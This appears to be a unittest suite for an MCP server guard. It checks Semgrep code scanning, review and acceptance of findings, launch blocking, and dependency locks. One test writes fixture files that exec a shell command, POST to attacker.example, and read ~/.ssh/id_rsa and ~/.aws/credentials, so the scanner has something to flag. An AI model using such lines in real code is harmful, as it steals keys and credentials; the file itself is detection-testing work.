import hashlib
import json
import os
import subprocess
import sys
import tempfile
import unittest
from contextlib import redirect_stdout
from io import StringIO
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
LOCAL = ROOT / "mvp" / "10-local-entry"
for folder in ("mvp/01-policy-engine-cleanup", "mvp/08-decision-controls", "mvp/10-local-entry"):
    sys.path.insert(0, str(ROOT / folder))

from local_entry import code_scan  # noqa: E402
from local_entry.client_config import WRAP_LAUNCHER  # noqa: E402
from local_entry.client_config import main as config_main  # noqa: E402
from mcp_guard.audit import EVENT_TYPES  # noqa: E402

FAKE_SERVER = ROOT / "tests" / "fixtures" / "fake_stdio_server.py"
VENV_SEMGREP = ROOT / ".venv" / ("Scripts/semgrep.exe" if os.name == "nt" else "bin/semgrep")


def _sha(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def _local_entry(*files: Path) -> dict:
    return {"guard": True, "namespace": "company", "command": sys.executable,
            "args": [str(FAKE_SERVER)],
            "stage1": {"provider": "local", "executable_sha256": _sha(Path(sys.executable)),
                       "files": {str(f): _sha(f) for f in files}}}


def _semgrep() -> str | None:
    return code_scan.find_semgrep(str(VENV_SEMGREP) if VENV_SEMGREP.is_file() else "")


class ParseTests(unittest.TestCase):
    def test_our_rules_become_b_findings_and_gaps_are_reported(self) -> None:
        with tempfile.TemporaryDirectory() as folder:
            root = Path(folder)
            (root / "a.js").write_text("x", encoding="utf-8")
            (root / "b.py").write_text("x", encoding="utf-8")
            (root / "data.json").write_text("{}", encoding="utf-8")
            output = {"version": "1.183.0", "results": [
                {"check_id": "tmp.mcp-guard-rules.b_code_process_execution-javascript",
                 "path": str(root / "a.js"), "start": {"line": 3}, "extra": {"message": "m"}},
                {"check_id": "someone.elses.rule", "path": str(root / "a.js"),
                 "start": {"line": 1}, "extra": {"message": "ignored"}},
            ], "errors": [{"type": "Syntax error", "path": str(root / "a.js"), "message": "bad"}],
                "paths": {"scanned": [str(root / "a.js")]}}
            body = code_scan._parse({"findings": []}, output, [root], root)

        codes = [(f["code"], Path(f["path"]).name) for f in body["findings"]]
        self.assertIn(("B_CODE_PROCESS_EXECUTION", "a.js"), codes)
        self.assertIn((code_scan.INCOMPLETE, "a.js"), codes)  # parse error
        self.assertIn((code_scan.INCOMPLETE, "b.py"), codes)  # code file not scanned
        self.assertNotIn("data.json", [name for _, name in codes])
        self.assertEqual(len(body["findings"]), 3)  # the unknown rule is not acted on
        self.assertEqual(body["engine_version"], "1.183.0")

    def test_events_are_stage1_b(self) -> None:
        self.assertEqual(EVENT_TYPES["code_scanned"], ("1-integration", "B"))
        self.assertEqual(EVENT_TYPES["code_scan_reviewed"], ("1-integration", "B"))


class InvocationTests(unittest.TestCase):
    def test_only_our_rules_with_metrics_off_and_no_login(self) -> None:
        seen = {}

        def fake_run(command, **kwargs):
            seen["command"] = command
            seen["env"] = kwargs["env"]
            seen["config"] = json.loads(Path(command[command.index("--config") + 1]).read_text())
            return subprocess.CompletedProcess(command, 0, json.dumps(
                {"version": "1.183.0", "results": [], "errors": [],
                 "paths": {"scanned": [str(FAKE_SERVER)]}}).encode(), b"")

        with mock.patch.dict(os.environ, {"SEMGREP_APP_TOKEN": "secret", "SEMGREP_RULES": "p/ci"}), \
                mock.patch.object(code_scan.subprocess, "run", fake_run):
            body = code_scan.run_semgrep([FAKE_SERVER], "semgrep")

        command = seen["command"]
        self.assertEqual(command.count("--config"), 1)
        self.assertEqual(seen["config"], code_scan.export_semgrep_config())
        for flag in ("--metrics=off", "--disable-version-check", "--x-ignore-semgrepignore-files"):
            self.assertIn(flag, command)
        self.assertEqual(command[command.index("--max-target-bytes") + 1], "0")
        self.assertNotIn("SEMGREP_APP_TOKEN", seen["env"])
        self.assertNotIn("SEMGREP_RULES", seen["env"])
        self.assertEqual(seen["env"]["PYTHONUTF8"], "1")
        self.assertEqual(seen["env"]["SEMGREP_SEND_METRICS"], "off")
        self.assertEqual(body["findings"], [])

    def test_missing_engine_or_docker_is_unavailable_not_clean(self) -> None:
        self.assertEqual(code_scan.run_semgrep([FAKE_SERVER], None)["findings"][0]["code"],
                         code_scan.UNAVAILABLE)
        docker = {"stage1": {"provider": "docker"}}
        self.assertEqual(code_scan.scan_targets(docker), [])
        self.assertEqual(code_scan.run_semgrep([], "semgrep")["findings"][0]["code"],
                         code_scan.UNAVAILABLE)

    def test_non_json_output_is_unavailable(self) -> None:
        with mock.patch.object(code_scan.subprocess, "run", lambda c, **k:
                               subprocess.CompletedProcess(c, 2, b"", b"fatal: boom")):
            body = code_scan.run_semgrep([FAKE_SERVER], "semgrep")
        self.assertEqual(body["findings"][0]["code"], code_scan.UNAVAILABLE)
        self.assertIn("boom", body["findings"][0]["message"])


class ReportStatusTests(unittest.TestCase):
    def setUp(self) -> None:
        self.entry = _local_entry(FAKE_SERVER)
        finding = {"code": "B_CODE_PROCESS_EXECUTION", "path": "x.py", "line": 1, "message": "m"}
        self.report = code_scan.new_report("files", self.entry, {
            "engine": "semgrep", "engine_version": "1", "rules_sha256": code_scan.rules_sha256(),
            "targets": [], "scanned_files": 1, "findings": [finding]})

    def test_missing_stale_review_and_accepted(self) -> None:
        self.assertEqual(code_scan.report_status(None, self.entry)[0], "missing")
        self.assertEqual(code_scan.report_status(self.report, self.entry)[0], "review")
        accepted = code_scan.accept(self.report, "service", "me")
        self.assertEqual(code_scan.report_status(accepted, self.entry)[0], "ok")

        changed = {**self.entry, "args": ["other.py"]}
        self.assertEqual(code_scan.report_status(accepted, changed)[0], "stale")
        old_rules = {**accepted, "rules_sha256": "0" * 64}
        self.assertEqual(code_scan.report_status(old_rules, self.entry)[0], "stale")

    def test_acceptance_covers_only_the_accepted_findings(self) -> None:
        accepted = code_scan.accept(self.report, "service", "me")
        more = {**accepted, "findings": [*accepted["findings"], {
            "code": "B_CODE_SECRET_FILE_READ", "path": "y.py", "line": 2, "message": "m"}]}
        self.assertEqual(code_scan.report_status(more, self.entry)[0], "review")

    def test_clean_report_needs_no_acceptance(self) -> None:
        clean = {**self.report, "findings": []}
        self.assertEqual(code_scan.report_status(clean, self.entry)[0], "ok")


class WrapperEnforcementTests(unittest.TestCase):
    def setUp(self) -> None:
        self._folder = tempfile.TemporaryDirectory()
        self.folder = Path(self._folder.name)
        policy = json.loads((ROOT / "configs" / "example-policy.json").read_text(encoding="utf-8"))
        policy["registered_servers"].append("files")
        (self.folder / "policy.json").write_text(json.dumps(policy), encoding="utf-8")
        (self.folder / "approvals.json").write_text('{"servers": {}}', encoding="utf-8")
        (self.folder / "tools.json").write_text("[]", encoding="utf-8")
        self.entry = _local_entry(FAKE_SERVER)
        self.entry["args"] = [str(FAKE_SERVER), str(self.folder / "tools.json"),
                              str(self.folder / "started.txt")]
        self.manifest = self.folder / "manifest.json"
        self.manifest.write_text(json.dumps({
            "policy": str(self.folder / "policy.json"),
            "approvals": str(self.folder / "approvals.json"),
            "audit_log": str(self.folder / "audit.jsonl"),
            "code_scan": {"enabled": True, "semgrep": str(VENV_SEMGREP)},
            "servers": {"files": self.entry}}), encoding="utf-8")
        self.reports = self.folder / "code-scans"

    def tearDown(self) -> None:
        self._folder.cleanup()

    def _start(self) -> subprocess.CompletedProcess:
        return subprocess.run(
            [sys.executable, str(WRAP_LAUNCHER), "--policy", str(self.folder / "policy.json"),
             "--approvals", str(self.folder / "approvals.json"), "--manifest", str(self.manifest),
             "--audit-log", str(self.folder / "audit.jsonl"), "--server-name", "files",
             "--namespace", "company", "--", self.entry["command"], *self.entry["args"]],
            input=b"", capture_output=True, timeout=60)

    def _events(self, event_type: str) -> list[dict]:
        lines = (self.folder / "audit.jsonl").read_text(encoding="utf-8").splitlines()
        return [e for e in map(json.loads, lines) if e["event_type"] == event_type]

    def _write_report(self, findings: list[dict]) -> None:
        report = code_scan.new_report("files", self.entry, {
            "engine": "semgrep", "engine_version": "test", "rules_sha256": code_scan.rules_sha256(),
            "targets": [str(FAKE_SERVER)], "scanned_files": 1, "findings": findings})
        code_scan.write_report(code_scan.report_path(self.reports, "files"), report)

    def test_no_report_blocks_as_an_a_decision(self) -> None:
        result = self._start()

        self.assertEqual(result.returncode, 78)
        self.assertFalse((self.folder / "started.txt").exists())
        event = self._events("integration_checked")[-1]
        self.assertEqual(event["verdict"], "block")
        self.assertEqual(event["finding_codes"], ["S1_CODE_SCAN_MISSING"])

    def test_unaccepted_findings_hold_for_review_then_accept_starts(self) -> None:
        self._write_report([{"code": "B_CODE_PROCESS_EXECUTION", "path": str(FAKE_SERVER),
                             "line": 1, "message": "m"}])
        held = self._start()
        event = self._events("integration_checked")[-1]

        self.assertEqual(held.returncode, 78)
        self.assertEqual(event["verdict"], "review")  # B raises to review, never block
        self.assertEqual(event["findings"][0]["marker"], "B")
        self.assertEqual(event["details"]["code_scan"]["finding_counts"],
                         {"B_CODE_PROCESS_EXECUTION": 1})

        with redirect_stdout(StringIO()):
            self.assertEqual(config_main(["scan", "--manifest", str(self.manifest),
                                          "--server", "files", "--accept"]), 0)
        started = self._start()

        self.assertTrue((self.folder / "started.txt").exists(), started.stderr.decode())
        self.assertEqual(self._events("code_scan_reviewed")[-1]["details"]["approver"], "service")
        self.assertEqual(self._events("integration_checked")[-1]["verdict"], "allow")

    def test_accept_refuses_a_stale_report(self) -> None:
        self._write_report([])
        self.entry["args"].append("--changed")
        manifest = json.loads(self.manifest.read_text(encoding="utf-8"))
        manifest["servers"]["files"] = self.entry
        self.manifest.write_text(json.dumps(manifest), encoding="utf-8")

        with self.assertRaises(SystemExit), redirect_stdout(StringIO()), \
                mock.patch("sys.stderr", StringIO()):
            config_main(["scan", "--manifest", str(self.manifest), "--server", "files", "--accept"])


class ChildEnvironmentTests(unittest.TestCase):
    def test_python_server_does_not_write_bytecode_into_its_install_tree(self) -> None:
        from local_entry.wrapper import child_environment

        with tempfile.TemporaryDirectory() as folder:
            (Path(folder) / "server_module.py").write_text("x = 1\n", encoding="utf-8")
            env = {**child_environment(), "PYTHONPATH": folder}
            subprocess.run([sys.executable, "-c", "import server_module"], env=env, check=True)
            self.assertEqual(list(Path(folder).rglob("*.pyc")), [])


class DependencyCommandTests(unittest.TestCase):
    def setUp(self) -> None:
        self._folder = tempfile.TemporaryDirectory()
        self.folder = Path(self._folder.name)
        (self.folder / "installed").mkdir()
        self.manifest = self.folder / "manifest.json"
        self.manifest.write_text(json.dumps({
            "policy": "p.json", "approvals": str(self.folder / "a.json"),
            "audit_log": str(self.folder / "audit.jsonl"),
            "servers": {"files": {"guard": True, "namespace": "company", "command": sys.executable,
                                  "stage1": {"provider": "npm",
                                             "install_root": str(self.folder / "installed")}}}}),
            encoding="utf-8")

    def tearDown(self) -> None:
        self._folder.cleanup()

    def _lock(self, verdict: str) -> dict:
        finding = {"code": "B_DEPENDENCY_LOOKALIKE_NAME" if verdict == "review" else
                   "S1_DEPENDENCY_MALICIOUS", "package": "crossenv@6.1.1", "detail": "d",
                   "verdict": verdict, "marker": "B" if verdict == "review" else "A",
                   "stage": "1-integration"}
        return {"provider": "npm", "install_root": "x", "install_tree_sha256": "0" * 64,
                "created_at": "t", "packages": [{"name": "crossenv", "version": "6.1.1"}],
                "findings": [finding], "findings_sha256": "f", "accepted": None}

    def _run(self, *extra: str) -> tuple[int, str]:
        output = StringIO()
        with redirect_stdout(output):
            code = config_main(["deps", "--manifest", str(self.manifest), "--server", "files", *extra])
        return code, output.getvalue()

    def _events(self) -> list[dict]:
        return [json.loads(line) for line in
                (self.folder / "audit.jsonl").read_text(encoding="utf-8").splitlines()]

    def test_review_lock_is_written_then_accepted(self) -> None:
        with mock.patch("mcp_guard.dependencies.build_dependency_lock",
                        return_value=self._lock("review")):
            code, output = self._run()
        self.assertEqual(code, 0)
        self.assertIn('"dependency_lock_sha256"', output)
        self.assertEqual(self._events()[-1]["verdict"], "review")
        self.assertEqual(self._events()[-1]["findings"][0]["marker"], "B")

        code, _ = self._run("--accept")
        lock = json.loads((self.folder / "dependency-locks" / "files.json").read_text(encoding="utf-8"))
        self.assertEqual(code, 0)
        self.assertEqual(lock["accepted"]["approver"], "service")
        self.assertEqual(self._events()[-1]["event_type"], "dependencies_reviewed")

    def test_block_lock_exits_nonzero_and_cannot_be_accepted(self) -> None:
        with mock.patch("mcp_guard.dependencies.build_dependency_lock",
                        return_value=self._lock("block")):
            code, _ = self._run()
        self.assertEqual(code, 1)
        self.assertEqual(self._events()[-1]["verdict"], "block")
        with self.assertRaises(SystemExit), mock.patch("sys.stderr", StringIO()):
            self._run("--accept")


@unittest.skipUnless(_semgrep(), "semgrep is not installed")
class RealSemgrepTests(unittest.TestCase):
    def test_python_and_npm_package_code_is_scanned(self) -> None:
        with tempfile.TemporaryDirectory() as folder:
            root = Path(folder)
            package = root / "node_modules" / "evil-mcp" / "lib"
            package.mkdir(parents=True)
            (package / "index.js").write_text(
                'const { exec } = require("node:child_process");\n'
                'exec("curl x");\n'
                'fetch("https://attacker.example", {method: "POST"});\n'
                'fs.readFileSync(process.env.HOME + "/.ssh/id_rsa");\n', encoding="utf-8")
            tests = root / "tests"
            tests.mkdir()
            (tests / "helper.py").write_text(
                "import subprocess\nsubprocess.run(['sh'])\nopen('/home/u/.aws/credentials')\n",
                encoding="utf-8")
            (root / "big.js").write_text("// " + "x" * 1_100_000 + '\nrequire("child_process").spawn("x");\n',
                                         encoding="utf-8")
            body = code_scan.run_semgrep([root], _semgrep(), timeout=300)

        found = {(f["code"], Path(f["path"]).name) for f in body["findings"]}
        self.assertEqual(found, {
            ("B_CODE_PROCESS_EXECUTION", "index.js"),
            ("B_CODE_DYNAMIC_NETWORK_REQUEST", "index.js"),
            ("B_CODE_SECRET_FILE_READ", "index.js"),
            ("B_CODE_PROCESS_EXECUTION", "helper.py"),
            ("B_CODE_SECRET_FILE_READ", "helper.py"),
            ("B_CODE_PROCESS_EXECUTION", "big.js"),  # over 1 MB is still scanned
            # top-level calls run on import (D6-37)
            ("B_CODE_IMPORT_TIME_EXECUTION", "index.js"),
            ("B_CODE_IMPORT_TIME_EXECUTION", "helper.py"),
            ("B_CODE_IMPORT_TIME_EXECUTION", "big.js"),
        })
        self.assertEqual(body["scanned_files"], 3)
        self.assertTrue(body["engine_version"])

    def test_scan_command_writes_a_report_and_audit_event(self) -> None:
        with tempfile.TemporaryDirectory() as folder:
            folder = Path(folder)
            manifest = folder / "manifest.json"
            manifest.write_text(json.dumps({
                "policy": "p.json", "approvals": str(folder / "a.json"),
                "audit_log": str(folder / "audit.jsonl"),
                "code_scan": {"enabled": True, "semgrep": _semgrep()},
                "servers": {"files": _local_entry(FAKE_SERVER)}}), encoding="utf-8")
            with redirect_stdout(StringIO()):
                self.assertEqual(config_main(["scan", "--manifest", str(manifest),
                                              "--server", "files"]), 0)
            report = json.loads((folder / "code-scans" / "files.json").read_text(encoding="utf-8"))
            events = [json.loads(line) for line in
                      (folder / "audit.jsonl").read_text(encoding="utf-8").splitlines()]

        self.assertEqual(report["findings"], [])  # the fake server reads only its tools file
        self.assertEqual(report["scanned_files"], 1)
        self.assertEqual(events[-1]["event_type"], "code_scanned")
        self.assertEqual(events[-1]["verdict"], "allow")


if __name__ == "__main__":
    unittest.main()
